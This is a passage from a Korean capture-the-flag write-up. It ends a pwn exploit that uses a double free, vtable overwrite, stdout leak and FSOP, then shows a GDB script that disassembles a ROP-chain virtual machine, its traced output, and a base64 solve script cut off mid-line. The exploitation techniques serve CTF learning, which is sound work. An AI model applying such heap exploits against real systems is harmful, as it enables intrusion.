set_plain_cipher_txt(0x20,p64(bin_base + 0x0DBE8)+p64(0)) # can be changed to heap # set_plain_cipher_txt(0x10,b\u0026#39;A\u0026#39;) # set_plain_cipher_txt(0x20,b\u0026#39;A\u0026#39;) # encrypt(1) # rv = (p.recv(0x20)) p.interactive() double free를 이용해서 AES_object + 0x0에 위치한 vtable을 dummy vtable로 수정하고 encrypt를 호출해 plain text를 노출시켜서 메모리 릭을 할 수 있다. 이후 stdout을 릭하고 이를 덮어서 FSOP를 했다.\nLor - Diablo (pwn) \u0026amp; LoR - mechagolem (rev) 리버싱 겸 포너블이였다. 먼저 디스어셈블러를 짜고 편의기능을 추가해서 분석을 시도했다.\nimport gdb import struct inf = gdb.selected_inferior() start = 0x34785000 end = 0x3478a2d0 tmp = inf.read_memory(start,end-start) chains = [] for i in range(((end-start)//8)): chains.append(struct.unpack(\u0026#39;\u0026lt;Q\u0026#39;, tmp[i*8:i*8+8])[0]) print(\u0026#39;chains ready\u0026#39;) # var_564edd86b078 = length gads = [] i = 0 while i \u0026lt; len(chains): ele = chains[i] if \u0026#39;r-x\u0026#39; in gdb.execute(f\u0026#39;xinfo {ele}\u0026#39;,to_string=True): out = gdb.execute(f\u0026#39;x/20xi {ele}\u0026#39;,to_string=True) if ele not in gads: gads.append(ele) lines = out.split(\u0026#39;\\n\u0026#39;) for line in lines: pass # print(line.split(\u0026#39;\\t\u0026#39;)[-1]) if \u0026#39;ret\u0026#39; in line: break else: pass # print(hex(ele)) i += 1 gads_ = [] c = 0 for i in gads: out = gdb.execute(f\u0026#39;x/20xi {i}\u0026#39;,to_string = True) lines = out.split(\u0026#39;\\n\u0026#39;) gads_.append([]) for line in lines: gads_[c].append(line.split(\u0026#39;\\t\u0026#39;)[-1]) if \u0026#39;ret\u0026#39; in line: break c += 1 # c = 0 # for i in gads_: # print(f\u0026#39;{hex(start+i*8)}: gads_[{c}] : \u0026#39;+\u0026#39;;\u0026#39;.join(i)) # c += 1 rax = 0 rbx = 0 rcx = 0 rdx = 0 rdi = 0 rsi = 0 r8 = 0 rbp = 0 rsp = 0 eflags = 0 const_1 = 0 bin_base = 0x000055765999c000 variables = { 0x12078 + bin_base : f\u0026#39;usr_input_len_{hex(bin_base+0x12078)[2:]}\u0026#39;, 0x12068 + bin_base : f\u0026#39;iterator_{hex(bin_base + 0x12068)[2:]}\u0026#39;, 0x12060 + bin_base : f\u0026#39;tmp_{hex(bin_base+0x12060)[2:]}\u0026#39; } ambig = 0b1 confi = 0b10 ambig_ptr = 0b100 reg_state ={ \u0026#39;rax\u0026#39; : ambig, \u0026#39;rbx\u0026#39; : ambig, \u0026#39;rcx\u0026#39; : ambig, \u0026#39;rdx\u0026#39; : ambig, \u0026#39;rdi\u0026#39; : ambig, \u0026#39;rsi\u0026#39; : ambig, \u0026#39;r8\u0026#39; : ambig, \u0026#39;rbp\u0026#39; : ambig, \u0026#39;rsp\u0026#39; : ambig, \u0026#39;eflags\u0026#39; : ambig } def process(addr): global i, chains, gads, rax, rbx, rcx, rdx, rdi, rsi, r8 ,rbp, rsp, eflags global variables, reg_state, ambig, confi if addr == gads[0]: if not const_1: if i == 0: print(\u0026#39;-------- main() ---------\u0026#39;) elif start+i*8 == 0x34785440: print(\u0026#39;-------- exit_internal() ---------\u0026#39;) print(f\u0026#39;{hex(start+i*8)}: rdx = {chains[i+1]} ; r12 = {chains[i+2]}\u0026#39;) rdx = chains[i+1] r12 = chains[i+2] reg_state[\u0026#39;rdx\u0026#39;] = confi | ambig_ptr reg_state[\u0026#39;r12\u0026#39;] = confi | ambig_ptr i += 2 elif addr == gads[1]: if not const_1: print(f\u0026#39;{hex(start+i*8)}: rsi = {chains[i+1]}\u0026#39;) rsi = chains[i+1] reg_state[\u0026#39;rsi\u0026#39;] = confi | ambig_ptr i += 1 elif addr == gads[2]: if not const_1: print(f\u0026#39;{hex(start+i*8)}: rdi = {chains[i+1]}\u0026#39;) rdi = chains[i+1] reg_state[\u0026#39;rdi\u0026#39;] = confi | ambig_ptr i += 1 elif addr == gads[3]: if not const_1: if start+i*8 == 0x34785390: print(\u0026#39;-------- encode() ---------\u0026#39;) elif start+i*8 == 0x347853c8: print(\u0026#39;-------- print() ---------\u0026#39;) elif start+i*8 == 0x34785400: print(\u0026#39;-------- exit() ---------\u0026#39;) elif start+i*8 == 0x347855d8: print(\u0026#39;-------- encode_internal() ---------\u0026#39;) print(f\u0026#39;{hex(start+i*8)}: rax = {chains[i+1]}\u0026#39;) rax = chains[i+1] reg_state[\u0026#39;rax\u0026#39;] = confi | ambig_ptr i += 1 elif addr == gads[4]: if rax == 1: if reg_state[\u0026#39;rdi\u0026#39;] \u0026amp; confi and reg_state[\u0026#39;rdx\u0026#39;] \u0026amp; confi and reg_state[\u0026#39;rsi\u0026#39;] \u0026amp; confi: out = gdb.execute(f\u0026#39;x/s {rsi}\u0026#39;,to_string = True) out = (out[out.index(\u0026#39;\u0026#34;\u0026#39;):-1]) print(f\u0026#39;{hex(start+i*8)}: sys_write({rdi}, {hex(rsi)}, {rdx}) // {out}\u0026#39;) rax = rdx reg_state[\u0026#39;rax\u0026#39;] |= confi else: if reg_state[\u0026#39;rdi\u0026#39;] \u0026amp; confi: if reg_state[\u0026#39;rdx\u0026#39;] \u0026amp; confi: print(f\u0026#39;{hex(start+i*8)}: sys_write({rdi}, {hex(rsi)}, {rdx})\u0026#39;) rax = rdx reg_state[\u0026#39;rax\u0026#39;] = confi else: print(f\u0026#39;{hex(start+i*8)}: sys_write({rdi}, {hex(rsi)}, rdx)\u0026#39;) reg_state[\u0026#39;rax\u0026#39;] = ambig else: print(f\u0026#39;{hex(start+i*8)}: sys_write(rdi, rsi, rdx)\u0026#39;) reg_state[\u0026#39;rax\u0026#39;] = ambig elif rax == 0: if rsi not in variables.keys() and reg_state[\u0026#39;rsi\u0026#39;] \u0026amp;confi: varname = hex(rsi).replace(\u0026#39;0x\u0026#39;,\u0026#39;\u0026#39;) variables[rsi] = f\u0026#39;buf_{varname}\u0026#39; if reg_state[\u0026#39;rdx\u0026#39;] \u0026amp; confi: if reg_state[\u0026#39;rdi\u0026#39;] \u0026amp; confi: if reg_state[\u0026#39;rsi\u0026#39;] \u0026amp; confi: print(f\u0026#39;{hex(start+i*8)}: sys_read({rdi}, {variables[rsi]}, {rdx})\u0026#39;) else: print(f\u0026#39;{hex(start+i*8)}: sys_read({rdi}, rsi , {rdx})\u0026#39;) else: print(f\u0026#39;{hex(start+i*8)}: sys_read(rdi, {variables[rsi]}, {rdx})\u0026#39;) rax = rdx reg_state[\u0026#39;rax\u0026#39;] = confi else: if reg_state[\u0026#39;rdi\u0026#39;] \u0026amp; confi: print(f\u0026#39;{hex(start+i*8)}: sys_read({rdi}, {variables[rsi]}, rdx)\u0026#39;) else: print(f\u0026#39;{hex(start+i*8)}: sys_read(rdi, {variables[rsi]}, rdx)\u0026#39;) reg_state[\u0026#39;rsi\u0026#39;] = confi reg_state[\u0026#39;rax\u0026#39;] = ambig elif rax == 60: if reg_state[\u0026#39;rdi\u0026#39;] \u0026amp; confi: print(f\u0026#39;{hex(start+i*8)}: sys_exit({rdi})\u0026#39;) else: print(f\u0026#39;{hex(start+i*8)}: sys_exit(rdi)\u0026#39;) else: print(f\u0026#39;{hex(start+i*8)}: syscall_{rax} ({rdi}, {rsi}, {rdx})\u0026#39;) elif addr == gads[5]: if not const_1: if reg_state[\u0026#39;rax\u0026#39;] \u0026amp; confi: if rax in variables.keys(): print(f\u0026#39;{hex(start+i*8)}: rax = (QWORD)({variables[rax]})\u0026#39;) else: print(f\u0026#39;{hex(start+i*8)}: rax = *(QWORD *)(rax) // *(QWORD *){hex(rax)}\u0026#39;) else: print(f\u0026#39;{hex(start+i*8)}: rax = *(QWORD *)(rax)\u0026#39;) reg_state[\u0026#39;rax\u0026#39;] = ambig | ambig_ptr rax = 0xdeadbeef elif addr == gads[6]: if reg_state[\u0026#39;rsi\u0026#39;] \u0026amp; confi: if reg_state[\u0026#39;rax\u0026#39;] \u0026amp; confi: reg_state[\u0026#39;rax\u0026#39;] = confi else: reg_state[\u0026#39;rax\u0026#39;] = ambig else: reg_state[\u0026#39;rax\u0026#39;] = ambig if not const_1: if reg_state[\u0026#39;rsi\u0026#39;] \u0026amp; confi: if reg_state[\u0026#39;rax\u0026#39;] \u0026amp; confi: print(f\u0026#39;{hex(start+i*8)}: eax \u0026amp;= esi // eax = {(rax)} \u0026amp; {(rsi)}\u0026#39;) reg_state[\u0026#39;rax\u0026#39;] = confi else: print(f\u0026#39;{hex(start+i*8)}: eax \u0026amp;= esi // eax \u0026amp;= {(rsi)}\u0026#39;) reg_state[\u0026#39;rax\u0026#39;] = ambig else: print(f\u0026#39;{hex(start+i*8)}: eax \u0026amp;= esi\u0026#39;) reg_state[\u0026#39;rax\u0026#39;] = ambig rax \u0026amp;= rsi\u0026amp;0xffffffff elif addr == gads[7]: if not const_1: if reg_state[\u0026#39;rdi\u0026#39;] \u0026amp; confi: if reg_state[\u0026#39;rax\u0026#39;] \u0026amp; confi: print(f\u0026#39;{hex(start+i*8)}: rax -= rdi // rax = {(rax)} - {(rdi)}\u0026#39;) reg_state[\u0026#39;rax\u0026#39;] = confi reg_state[\u0026#39;eflags\u0026#39;] = confi eflags = (rax - rdi)\u0026amp;0xfffffffffffffffff == 0 else: print(f\u0026#39;{hex(start+i*8)}: rax -= rdi // rax -= {(rdi)}\u0026#39;) reg_state[\u0026#39;rax\u0026#39;] = ambig reg_state[\u0026#39;eflags\u0026#39;] = ambig else: print(f\u0026#39;{hex(start+i*8)}: rax -= rdi\u0026#39;) reg_state[\u0026#39;rax\u0026#39;] = ambig reg_state[\u0026#39;eflags\u0026#39;] = ambig rax -= rdi rax \u0026amp;= 0xffffffffffffffff elif addr == gads[8]: if not const_1: if reg_state[\u0026#39;eflags\u0026#39;] \u0026amp;ambig: if reg_state[\u0026#39;rax\u0026#39;] \u0026amp; confi: if reg_state[\u0026#39;rdx\u0026#39;] \u0026amp; confi: print(f\u0026#39;{hex(start+i*8)}: if true -\u0026gt; rax = {hex(rdx)} else -\u0026gt; rax = {hex(rax)}\u0026#39;) else: print(f\u0026#39;{hex(start+i*8)}: if true -\u0026gt; rax = {hex(rdx)} else -\u0026gt; rax = rax\u0026#39;) else: print(f\u0026#39;{hex(start+i*8)}: if true -\u0026gt; rax = rdx else -\u0026gt; rax = rax\u0026#39;) reg_state[\u0026#39;rax\u0026#39;] = ambig else: if eflags: if reg_state[\u0026#39;rax\u0026#39;] \u0026amp; confi: print(f\u0026#39;{hex(start+i*8)}: rax = {hex(rdx)}\u0026#39;) else: print(f\u0026#39;{hex(start+i*8)}: rax = rdx\u0026#39;) else: if reg_state[\u0026#39;rdx\u0026#39;] \u0026amp; confi: print(f\u0026#39;{hex(start+i*8)}: rax = {hex(rdx)}\u0026#39;) else: pass reg_state[\u0026#39;rax\u0026#39;] = ambig | ambig_ptr rax = 0xdeadbeef elif addr == gads[9]: if not const_1: if reg_state[\u0026#39;rax\u0026#39;] \u0026amp; ambig: print(f\u0026#39;{hex(start+i*8)}: rdx |= rax\u0026#39;) reg_state[\u0026#39;rdx\u0026#39;] = ambig rdx = 0xdeadbeef else: print(f\u0026#39;{hex(start+i*8)}: rdx |= rax // rdx |= {rax}\u0026#39;) reg_state[\u0026#39;rdx\u0026#39;] = confi rdx |= rax elif addr == gads[10]: if not const_1: if reg_state[\u0026#39;rdx\u0026#39;] \u0026amp; confi: if rdx == 0x34785050: print(f\u0026#39;{hex(start+i*8)}: rsp = rdx // rsp = main+0x50 // back to menu\u0026#39;) elif rdx == 0x34785370: print(f\u0026#39;{hex(start+i*8)}: rsp = rdx // rsp = main+0x370 // back to menu\u0026#39;) else: print(f\u0026#39;{hex(start+i*8)}: rsp = rdx // rsp = {hex(rdx)}\u0026#39;) reg_state[\u0026#39;rsp\u0026#39;] = confi rsp = rdx else: print(f\u0026#39;{hex(start+i*8)}: rsp = rdx\u0026#39;) reg_state[\u0026#39;rsp\u0026#39;] = ambig rsp = 0xdeadbeef elif addr == gads[11]: # mroe interpretation required if not const_1: if reg_state[\u0026#39;rax\u0026#39;] \u0026amp; confi: print(f\u0026#39;{hex(start+i*8)}: inc idx ; stack[idx] = rsp ; rsp = {hex(rax)}\u0026#39;) reg_state[\u0026#39;rsp\u0026#39;] = confi rsp = rax else: print(f\u0026#39;{hex(start+i*8)}: inc idx ; stack[idx] = rsp ; rsp = rax\u0026#39;) reg_state[\u0026#39;rsp\u0026#39;] = ambig elif addr == gads[12]: if not const_1: if reg_state[\u0026#39;rbp\u0026#39;] \u0026amp; confi: print(f\u0026#39;{hex(start+i*8)}: mov rsp, {(rbp)} ; pop rbp\u0026#39;) else: if start+i*8 == 0x34785438: print(\u0026#39;-------- function_4() ---------\u0026#39;) print(f\u0026#39;{hex(start+i*8)}: mov rsp, rbp ; pop rbp\u0026#39;) if reg_state[\u0026#39;rbp\u0026#39;] \u0026amp; confi: rsp = rbp reg_state[\u0026#39;rsp\u0026#39;] = confi reg_state[\u0026#39;rbp\u0026#39;] = ambig rbp = 0xdeadbeef elif addr == gads[13]: if not const_1: if reg_state[\u0026#39;rax\u0026#39;] \u0026amp; confi: print(f\u0026#39;{hex(start+i*8)}: r8d = eax; eax = r8d\u0026#39;) r8 = rax \u0026amp;0xffffffff rax = r8 reg_state[\u0026#39;r8\u0026#39;] = confi else: print(f\u0026#39;{hex(start+i*8)}: r8d = eax; eax = r8d\u0026#39;) r8 = 0xdeadbeef rax = r8 reg_state[\u0026#39;r8\u0026#39;] = ambig elif addr == gads[14]: if not const_1: if reg_state[\u0026#39;rax\u0026#39;] \u0026amp; confi: print(f\u0026#39;{hex(start+i*8)}: rax -= 1 // rax = {rax} - 1\u0026#39;) rax -= 1 rax \u0026amp;=0xffffffffffffffff else: print(f\u0026#39;{hex(start+i*8)}: rax -= 1\u0026#39;) rax = 0xdeadbeef reg_state[\u0026#39;rax\u0026#39;] = ambig elif addr == gads[15]: if rdx not in variables.keys() and reg_state[\u0026#39;rdx\u0026#39;] \u0026amp;confi: varname = hex(rdx).replace(\u0026#39;0x\u0026#39;,\u0026#39;\u0026#39;) variables[rdx] = f\u0026#39;var_{varname}\u0026#39; if not const_1: if reg_state[\u0026#39;rax\u0026#39;] \u0026amp; confi: if reg_state[\u0026#39;rdx\u0026#39;] \u0026amp; confi: print(f\u0026#39;{hex(start+i*8)}: (QWORD){variables[rdx]} = {rax}\u0026#39;) else: print(f\u0026#39;{hex(start+i*8)}: *(QWORD *)(rdx) = {rax}\u0026#39;) elif reg_state[\u0026#39;rdx\u0026#39;] \u0026amp; confi: print(f\u0026#39;{hex(start+i*8)}: *(QWORD *)({variables[rdx]}) = rax\u0026#39;) else: print(f\u0026#39;{hex(start+i*8)}: *(QWORD *)(rdx) = rax\u0026#39;) # must write memory elif addr == gads[16]: if rsi not in variables.keys() and reg_state[\u0026#39;rsi\u0026#39;] \u0026amp;confi: varname = hex(rsi).replace(\u0026#39;0x\u0026#39;,\u0026#39;\u0026#39;) variables[rsi] = f\u0026#39;var_{varname}\u0026#39; if not const_1: if reg_state[\u0026#39;rsi\u0026#39;] \u0026amp; confi: if reg_state[\u0026#39;rdi\u0026#39;] \u0026amp; confi: print(f\u0026#39;{hex(start+i*8)}: (QWORD)({variables[(rsi)]}) = {rdi}\u0026#39;) else: print(f\u0026#39;{hex(start+i*8)}: (QWORD)({variables[(rsi)]}) = rdi\u0026#39;) elif reg_state[\u0026#39;rdi\u0026#39;] \u0026amp; confi: print(f\u0026#39;{hex(start+i*8)}: *(QWORD *)(rsi) = {rdi}\u0026#39;) else: print(f\u0026#39;{hex(start+i*8)}: *(QWORD *)(rsi) = rdi\u0026#39;) # must write memory elif addr == gads[17]: if not const_1: if reg_state[\u0026#39;rdi\u0026#39;] \u0026amp; confi: if (rdi+0x18) in variables: print(f\u0026#39;{hex(start+i*8)}: rax -= (QWORD)({variables[rdi+0x18]})\u0026#39;) else: print(f\u0026#39;{hex(start+i*8)}: rax -= *(QWORD *)({rdi+0x18})\u0026#39;) else: print(f\u0026#39;{hex(start+i*8)}: rax -= *(QWORD *)(rdi+0x18)\u0026#39;) reg_state[\u0026#39;rax\u0026#39;] = ambig rax = 0xdeadbeef elif addr == gads[18]: if not const_1: print(f\u0026#39;{hex(start+i*8)}: rbx = {chains[i+1]}\u0026#39;) reg_state[\u0026#39;rbx\u0026#39;] = confi rbx = chains[i+1] i += 1 elif addr == gads[19]: if not const_1: print(f\u0026#39;{hex(start+i*8)}: rax += rbx ; rbx = {chains[i+1]} ; rbp = {chains[i+2]} ; r12 = {chains[i+3]} ; r13 = {chains[i+4]}\u0026#39;) rax += rbx rax \u0026amp;= 0xffffffffffffffff rbx = chains[i+1] rbp = chains[i+2] r12 = chains[i+3] r13 = chains[i+4] reg_state[\u0026#39;rbx\u0026#39;] = confi reg_state[\u0026#39;rbp\u0026#39;] = confi reg_state[\u0026#39;r12\u0026#39;] = confi reg_state[\u0026#39;r13\u0026#39;] = confi i += 4 elif addr == gads[20]: if not const_1: print(f\u0026#39;{hex(start+i*8)}: rcx = {chains[i+1]}\u0026#39;) rcx = chains[i+1] reg_state[\u0026#39;rcx\u0026#39;] = confi i += 1 elif addr == gads[21]: if rdi not in variables.keys() and reg_state[\u0026#39;rdi\u0026#39;] \u0026amp;confi: varname = hex(rdi).replace(\u0026#39;0x\u0026#39;,\u0026#39;\u0026#39;) variables[rdi] = f\u0026#39;var_{varname}\u0026#39; if not const_1: if reg_state[\u0026#39;rdi\u0026#39;] \u0026amp; confi: print(f\u0026#39;{hex(start+i*8)}: rax \u0026lt;\u0026lt;= cl ; (QWORD)({variables[rdi]}) |= rax ; eax = 0\u0026#39;) else: print(f\u0026#39;{hex(start+i*8)}: rax \u0026lt;\u0026lt;= cl ; *(QWORD *)(rdi) |= rax ; eax = 0\u0026#39;) rax \u0026lt;\u0026lt;= (rcx\u0026amp;0xff) reg_state[\u0026#39;rax\u0026#39;] = confi rax = 0 \\#mem accesss needed elif addr == gads[22]: if rax not in variables.keys() and reg_state[\u0026#39;rax\u0026#39;] \u0026amp;confi: varname = hex(rax).replace(\u0026#39;0x\u0026#39;,\u0026#39;\u0026#39;) variables[rax] = f\u0026#39;var_{varname}\u0026#39; if not const_1: if reg_state[\u0026#39;rax\u0026#39;] \u0026amp; confi: print(f\u0026#39;{hex(start+i*8)}: (DWORD)({variables[rax]}) += 1\u0026#39;) else: print(f\u0026#39;{hex(start+i*8)}: *(DWORD *)(rax) += 1\u0026#39;) elif addr == gads[23]: if not const_1: print(f\u0026#39;{hex(start+i*8)}: invalid ops\u0026#39;) elif addr == gads[24]: if not const_1: if reg_state[\u0026#39;rdi\u0026#39;] \u0026amp; confi: print(f\u0026#39;{hex(start+i*8)}: rax += {rdi}\u0026#39;) else: print(f\u0026#39;{hex(start+i*8)}: rax += rdi\u0026#39;) if reg_state[\u0026#39;rax\u0026#39;] \u0026amp; confi and reg_state[\u0026#39;rdi\u0026#39;] \u0026amp; confi: rax += rdi rax \u0026amp;= 0xffffffffffffffff elif addr == gads[25]: if not const_1: print(f\u0026#39;{hex(start+i*8)}: rax \u0026gt;\u0026gt;= 6\u0026#39;) if reg_state[\u0026#39;rax\u0026#39;] \u0026amp; confi: rax \u0026gt;\u0026gt;= 6 else: rax = 0xdeadbeef elif addr == gads[26]: if not const_1: if reg_state[\u0026#39;rdx\u0026#39;] \u0026amp; confi: if reg_state[\u0026#39;rax\u0026#39;] \u0026amp; confi: print(f\u0026#39;{hex(start+i*8)}: *(BYTE *)({rdx}) = {rax\u0026amp;0xff} ; rax = rdi\u0026#39;) else: print(f\u0026#39;{hex(start+i*8)}: *(BYTE *)({rdx}) = rax ; rax = rdi\u0026#39;) else: print(f\u0026#39;{hex(start+i*8)}: *(BYTE *)(rdx) = rax ; rax = rdi\u0026#39;) if reg_state[\u0026#39;rdi\u0026#39;] \u0026amp; confi: reg_state[\u0026#39;rax\u0026#39;] = confi rax = rdi else: rax = 0xdeadbeef # memory access needed rax = rdi elif addr == gads[27]: if not const_1: print(f\u0026#39;{hex(start+i*8)}: eax *= 2\u0026#39;) if reg_state[\u0026#39;rax\u0026#39;] \u0026amp; confi: rax *= 2 rax \u0026amp;=0xffffffff else: rax = 0xdeadbeef elif addr == gads[28]: # more if not const_1: print(f\u0026#39;{hex(start+i*8)}: rsp = stack[idx] ; idx -= 1\u0026#39;) elif addr == gads[29]: if not const_1: print(f\u0026#39;{hex(start+i*8)}: xchg edi, eax\u0026#39;) if reg_state[\u0026#39;rax\u0026#39;] \u0026amp; confi and reg_state[\u0026#39;rdi\u0026#39;] \u0026amp; confi: tmp = rdi\u0026amp;0xffffffff rdi = rax\u0026amp;0xffffffff rax = tmp elif addr == gads[30]: if not const_1: print(f\u0026#39;{hex(start+i*8)}: eax \u0026lt;\u0026lt;= 0x17 ; ecx |= eax\u0026#39;) if reg_state[\u0026#39;rax\u0026#39;] \u0026amp; confi : rax \u0026lt;\u0026lt;= 0x17 rax \u0026amp;=0xffffffff if reg_state[\u0026#39;rcx\u0026#39;] \u0026amp; conf : rcx |= (rax\u0026amp;0xffffffff) else: rcx = 0xdeadbeef else: rax = 0xdeadbeef else: print(\u0026#39;GG\u0026#39;) exit() i = 0 while i \u0026lt; len(chains): ele = chains[i] if \u0026#39;r-x\u0026#39; in gdb.execute(f\u0026#39;xinfo {ele}\u0026#39;,to_string=True): process(ele) # break else: pass print(f\u0026#39;{hex(start+i*8)}: {hex(ele)}\u0026#39;) i += 1 나름대로 레지스터들의 상태를 기록하고 그 시점에 연산이 가능한지 아닌지에 대해서 판단을 해서, 연산이 가능하면 주석으로 그 결과를 표시한다. 시스템 콜의 번호들도 그 시점에 연산이 가능한 경우 직접 sys_read 같은 시스템 콜로 래핑해서 출력한다.\nchains ready -------- main() --------- 0x34785000: rdx = 23 ; r12 = 0 0x34785018: rsi = 93966797815905 0x34785028: rdi = 1 0x34785038: rax = 1 0x34785048: sys_write(1, 0x5576599ac061, 23) // \u0026#34;Simple Base64 Encoder!\\n\u0026#34; 0x34785050: rdx = 29 ; r12 = 0 0x34785068: rsi = 93966797815950 0x34785078: rdi = 1 0x34785088: rax = 1 0x34785098: sys_write(1, 0x5576599ac08e, 29) // \u0026#34;1. Encode\\n2. Print\\n3. Exit\\n\u0026gt; \u0026#34; 0x347850a0: rdx = 2 ; r12 = 0 0x347850b8: rsi = 93966797857408 0x347850c8: rdi = 0 0x347850d8: rax = 0 0x347850e8: sys_read(0, buf_5576599b6280, 2) 0x347850f0: rdi = 2609 0x34785100: rax = 93966797857408 0x34785110: rax = (QWORD)(buf_5576599b6280) 0x34785118: rsi = 65535 0x34785128: eax \u0026amp;= esi // eax \u0026amp;= 65535 0x34785130: rax -= rdi // rax -= 2609 0x34785138: rax = 880300432 0x34785148: rdx = 880300944 ; r12 = 0 0x34785160: if true -\u0026gt; rax = 0x34785390 else -\u0026gt; rax = 0x34785190 0x34785168: rdx = 0 ; r12 = 4294967295 이런식으로 결과가 출력된다.\n0x34788db8: rdx = 880315912 ; r12 = 0 0x34788dd0: if true -\u0026gt; rax = 0x34788e08 else -\u0026gt; rax = 0x3478a218 0x34788dd8: rdx = 0 ; r12 = 4294967295 0x34788df0: rdx |= rax 0x34788df8: rsp = rdx 0x34788e00: invalid ops 0x34788e08: rax = 93966797857408 0x34788e18: rbx = 41 0x34788e28: rax += rbx ; rbx = 93966797857408 ; rbp = 0 ; r12 = 0 ; r13 = 4294967295 0x34788e50: rax = *(QWORD *)(rax) // *(QWORD *)0x5576599b62a9 0x34788e58: rsi = 255 0x34788e68: eax \u0026amp;= esi // eax \u0026amp;= 255 0x34788e70: rdi = 414588904 0x34788e80: xchg edi, eax 0x34788e88: rax \u0026gt;\u0026gt;= 6 0x34788e90: rsi = 255 0x34788ea0: rax \u0026gt;\u0026gt;= 6 0x34788ea8: eax \u0026amp;= esi // eax \u0026amp;= 255 0x34788eb0: xchg edi, eax 0x34788eb8: rax -= rdi // rax -= 414588904 0x34788ec0: rax = 880321048 0x34788ed0: rdx = 880316192 ; r12 = 0 0x34788ee8: if true -\u0026gt; rax = 0x34788f20 else -\u0026gt; rax = 0x3478a218 0x34788ef0: rdx = 0 ; r12 = 4294967295 0x34788f08: rdx |= rax 0x34788f10: rsp = rdx 0x34788f18: invalid ops 0x34788f20: rax = 93966797857408 0x34788f30: rbx = 42 0x34788f40: rax += rbx ; rbx = 93966797857408 ; rbp = 0 ; r12 = 0 ; r13 = 4294967295 0x34788f68: rax = *(QWORD *)(rax) // *(QWORD *)0x5576599b62aa 0x34788f70: rsi = 255 0x34788f80: eax \u0026amp;= esi // eax \u0026amp;= 255 0x34788f88: eax *= 2 0x34788f90: eax *= 2 0x34788f98: rdi = 392 0x34788fa8: rax -= rdi // rax -= 392 0x34788fb0: rax = 880321048 0x34788fc0: rdx = 880316432 ; r12 = 0 0x34788fd8: if true -\u0026gt; rax = 0x34789010 else -\u0026gt; rax = 0x3478a218 0x34788fe0: rdx = 0 ; r12 = 4294967295 0x34788ff8: rdx |= rax 0x34789000: rsp = rdx 0x34789008: invalid ops 0x34789010: rax = 93966797857408 0x34789020: rbx = 43 0x34789030: rax += rbx ; rbx = 93966797857408 ; rbp = 0 ; r12 = 0 ; r13 = 4294967295 0x34789058: rax = *(QWORD *)(rax) // *(QWORD *)0x5576599b62ab 0x34789060: rsi = 255 0x34789070: eax \u0026amp;= esi // eax \u0026amp;= 255 0x34789078: rdi = 912316478 0x34789088: xchg edi, eax 0x34789090: rsi = 4286578688 0x347890a0: eax \u0026amp;= esi // eax \u0026amp;= 4286578688 0x347890a8: xchg edi, eax 0x347890b0: eax \u0026lt;\u0026lt;= 0x17 ; ecx |= eax 0x347890b8: rax -= rdi // rax -= 912316478 0x347890c0: rax = 880321048 0x347890d0: rdx = 880316704 ; r12 = 0 0x347890e8: if true -\u0026gt; rax = 0x34789120 else -\u0026gt; rax = 0x3478a218 0x347890f0: rdx = 0 ; r12 = 4294967295 0x34789108: rdx |= rax 0x34789110: rsp = rdx 0x34789118: invalid ops 0x34789120: rax = 93966797857408 0x34789130: rbx = 44 0x34789140: rax += rbx ; rbx = 93966797857408 ; rbp = 0 ; r12 = 0 ; r13 = 4294967295 0x34789168: rax = *(QWORD *)(rax) // *(QWORD *)0x5576599b62ac 0x34789170: rsi = 255 0x34789180: eax \u0026amp;= esi // eax \u0026amp;= 255 0x34789188: rdi = 1699151259 0x34789198: xchg edi, eax 0x347891a0: rax \u0026gt;\u0026gt;= 6 0x347891a8: rsi = 255 0x347891b8: rax \u0026gt;\u0026gt;= 6 0x347891c0: eax \u0026amp;= esi // eax \u0026amp;= 255 0x347891c8: xchg edi, eax 0x347891d0: rax -= rdi // rax -= 1699151259 0x347891d8: rax = 880321048 0x347891e8: rdx = 880316984 ; r12 = 0 0x34789200: if true -\u0026gt; rax = 0x34789238 else -\u0026gt; rax = 0x3478a218 0x34789208: rdx = 0 ; r12 = 4294967295 0x34789220: rdx |= rax 0x34789228: rsp = rdx 0x34789230: invalid ops 0x34789238: rax = 93966797857408 0x34789248: rbx = 45 0x34789258: rax += rbx ; rbx = 93966797857408 ; rbp = 0 ; r12 = 0 ; r13 = 4294967295 0x34789280: rax = *(QWORD *)(rax) // *(QWORD *)0x5576599b62ad 0x34789288: rsi = 255 0x34789298: eax \u0026amp;= esi // eax \u0026amp;= 255 0x347892a0: eax *= 2 0x347892a8: eax *= 2 0x347892b0: rdi = 500 0x347892c0: rax -= rdi // rax -= 500 0x347892c8: rax = 880321048 0x347892d8: rdx = 880317224 ; r12 = 0 0x347892f0: if true -\u0026gt; rax = 0x34789328 else -\u0026gt; rax = 0x3478a218 0x347892f8: rdx = 0 ; r12 = 4294967295 0x34789310: rdx |= rax 0x34789318: rsp = rdx 0x34789320: invalid ops 0x34789328: rsi = 93966797856896 0x34789338: rdi = 1095002458 0x34789348: xchg edi, eax 0x34789350: rax \u0026gt;\u0026gt;= 6 0x34789358: rax \u0026gt;\u0026gt;= 6 0x34789360: rax \u0026gt;\u0026gt;= 6 0x34789368: rax \u0026gt;\u0026gt;= 6 0x34789370: xchg edi, eax 0x34789378: (QWORD)(var_5576599b6080) = 1095002458 0x34789380: rdi = 1 0x34789390: rdx = 1 ; r12 = 0 0x347893a8: rax = 1 0x347893b8: sys_write(1, 0x5576599b6080, 1) // \u0026#34;\\n\u0026#34; 리버싱같은 경우에는 마지막에 검증 로직이 한글자씩 박혀있어서 이를 연산하면 구할 수 있다.\nRev sol def encode(input): output = \u0026#39;\u0026#39; table = \u0026#34;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\u0026#34; padding = \u0026#39;QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFB\u0026#39; input = input.encode() for i in range(len(input)//3): r = input[i*3:i*3+3] tmp = (r[0] \u0026lt;\u0026lt; 16) | (r[1] \u0026lt;\u0026lt; 8) | (r[2] \u0026lt;\u0026lt; 0) for j in range(3,-1,-1): output += 